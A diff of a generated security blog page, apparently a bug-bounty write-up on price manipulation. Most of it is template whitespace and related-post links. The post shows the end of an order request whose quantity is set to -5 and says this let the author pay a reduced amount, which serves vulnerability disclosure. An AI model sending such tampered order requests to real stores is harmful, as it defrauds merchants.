+  </span><span class="nl">"saltedhash"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hashcode"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"product_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"121212"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"price"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"quantity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"-5"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"amount_to_be_paid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ABC city, ABC."</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"zipcode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"123456"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>By changing the <code class="language-plaintext highlighter-rouge">quantity</code> value to a negative number, it was possible to pay a reduced amount for the orders placed.</p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
 
 
+</div>
+
+
+    <div class="blog-navigation">
+        
+            <a class="prev" href="http://localhost:4000/Account_Takeover-via-session-storage/">&laquo; Account Takeover Through Manipulation of Session Storage</a>
+        
+        
+            <a class="next" href="http://localhost:4000/Bypassing_waf_sql_dump/">Bypassing Web Application Firewall (WAF) to Exploit SQL Injection Vulnerabilities &raquo;</a>
+        
+    </div>
 
 
 
@@ -564,14 +692,6 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
             
                 
@@ -580,23 +700,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -615,7 +719,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
+        
             
                 
             
@@ -631,39 +735,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -682,7 +754,15 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
+        
+            
                 
+            
+                
+            
+                
+            
+        
             
                 
             
@@ -701,14 +781,6 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
             
                 
@@ -717,23 +789,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -752,14 +808,6 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
             
                 
@@ -768,7 +816,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
+        
             
                 
             
@@ -787,7 +835,38 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
+        
+            
                 
+            
+                
+            
+                
+            
+        
+            
+                
+            
+                
+                    
+                    <h4>Related Posts</h4>
+                    <ul>
+                    
+                    <li class="relatedPost">
+                        <a href="http://localhost:4000/Account_Takeover-via-session-storage/">Account Takeover Through Manipulation of Session Storage
+                        
+                        </a>
+                    </li>
+                    
+                    
+                
+            
+                
+            
+        
+    
+        
+        
             
                 
             
@@ -803,7 +882,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
+        
             
                 
             
@@ -816,10 +895,22 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
                 
             
                 
-            
+                    
+                    <li class="relatedPost">
+                        <a href="http://localhost:4000/Hacking_MNCs-CMS_Systems/">Exploiting Misconfigurations and Authorization Vulnerabilities in a Multinational Company's Content Management System
+                        
+                        </a>
+                    </li>
+                    
+                    
                 
             
                 
+            
+        
+    
+        
+        
             
                 
             
@@ -838,14 +929,6 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
             
                 
@@ -854,23 +937,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -889,7 +956,27 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
+        
+            
                 
+            
+                
+                    
+                    <li class="relatedPost">
+                        <a href="http://localhost:4000/Insecure_Deserialization/">Insecure Deserialization
+                        
+                        </a>
+                    </li>
+                    
+                    
+                
+            
+                
+            
+        
+    
+        
+        
             
                 
             
@@ -905,23 +992,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -940,7 +1011,27 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
+        
+            
                 
+            
+                
+                    
+                    <li class="relatedPost">
+                        <a href="http://localhost:4000/PII-Leak/">API Security Misconfiguration Leads to tons of PII data Leakage
+                        
+                        </a>
+                    </li>
+                    
+                    
+                
+            
+                
+            
+        
+    
+        
+        
             
                 
             
@@ -953,10 +1044,30 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
                 
             
                 
+                    
+                    <li class="relatedPost">
+                        <a href="http://localhost:4000/Sql-injection/">Time-Based SQL Injection to Dumping the Database
+                        
+                        </a>
+                    </li>
+                    
+                    
+                
+            
+                
+            
+        
+    
+        
+        
             
                 
             
                 
+            
+                
+            
+        
             
                 
             
@@ -975,39 +1086,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -1026,14 +1105,6 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
             
                 
@@ -1042,7 +1113,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
+        
             
                 
             
@@ -1061,23 +1132,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -1096,23 +1151,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -1131,55 +1170,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -1198,23 +1189,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -1233,103 +1208,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
                 
             
-                
-            
-                
-            
-                
-            
-                
-            
         
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
             
                 
             
@@ -1339,283 +1218,8 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
             
         
     
-        
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
     
-        
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-    
-        
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-    
-        
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-    
-        
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-    
-        
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-    
-        
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-                
-            
-        
-    
+        </ul>
     
 </div>
 
@@ -1626,21 +1230,21 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
     <div class="toleft">
         <img
             class="selfie"
-            src="http://localhost:4000/"
-            alt=""
+            src="http://localhost:4000/assets/images/profile.jpg"
+            alt="Naveen J"
         />
     </div>
 
     <div class="toright">
-        <h4 class="name"></h4>
-        <p class="bio"></p>
+        <h4 class="name">Naveen J</h4>
+        <p class="bio">Security Researcher | Appsec Specialist@SISA Information Security | Web 3 Security Enthusiast</p>
 
         <div class="share">
             <!-- Note: Only use three share links if your site width is set to large -->
             <!-- If site width is set to normal, you may choose any two share links -->
             <a
                 class="twitter"
-                href="https://twitter.com/intent/tweet?text=http://localhost:4000/Bug-Bounty-Arsenal/ - Bug Bounty Arsenal by @"
+                href="https://twitter.com/intent/tweet?text=http://localhost:4000/Business_logic_error/ - Exploiting Business Logic Error: Price Manipulation by @thevillagehackr"
             >
                 <i class="fa-brands fa-twitter"></i>
                 <span class="icon-twitter">Tweet</span>
@@ -1655,7 +1259,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
                 <span class="icon-facebook-rect">Share</span>
             </a>
 
-            <!-- <a class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/Bug-Bounty-Arsenal/&amp;title=Bug Bounty Arsenal&amp;summary=The Repository contains various payloads, tools, tips and tricks from various hackers around the world.&amp;source=http://localhost:4000" target="_blank">
+            <!-- <a class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/Business_logic_error/&amp;title=Exploiting Business Logic Error: Price Manipulation&amp;summary=This blog discusses the exploitation of a business logic error that allows users to manipulate prices and pay less for the products and services offered by the target company.&amp;source=http://localhost:4000" target="_blank">
                 <i class="fa-brands fa-linkedin"></i>
                 <span class="icon-linkedin">Share</span>
             </a> -->
